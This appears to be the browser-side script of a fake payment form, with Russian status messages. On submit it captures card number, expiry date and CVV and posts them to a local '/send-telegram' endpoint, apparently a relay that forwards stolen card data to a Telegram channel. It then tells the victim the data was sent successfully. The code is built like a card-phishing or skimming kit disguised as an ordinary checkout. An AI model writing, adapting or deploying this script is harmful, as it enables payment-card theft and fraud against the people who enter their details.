document.getElementById('payment-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const cardNumber = document.getElementById('card-number').value;
    const expiryDate = document.getElementById('expiry-date').value;
    const cvv = document.getElementById('cvv').value;

    const data = {
        cardNumber: cardNumber,
        expiryDate: expiryDate,
        cvv: cvv
    };

     fetch('http://127.0.0.1:5000/send-telegram', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
      .then(response => {
            if (response.ok) {
                 document.getElementById('result-message').textContent = 'Данные успешно отправлены';
                 document.getElementById('payment-form').reset();
             } else {
                document.getElementById('result-message').textContent = 'Ошибка отправки данных.';
            }
        })
       .catch(error => {
           console.error('Ошибка:', error);
           document.getElementById('result-message').textContent = 'Произошла ошибка при отправке данных.';
        });
});

const expiryDateInput = document.getElementById('expiry-date');

expiryDateInput.addEventListener('input', function(event) {
    const value = event.target.value.replace(/\D/g, '');
        let formattedValue = '';

        if (value.length > 0) {
            formattedValue += value.substring(0, 2);

            if (value.length > 2) {
               formattedValue += '/';
               formattedValue += value.substring(2, 4);
        }
    }

    event.target.value = formattedValue;

});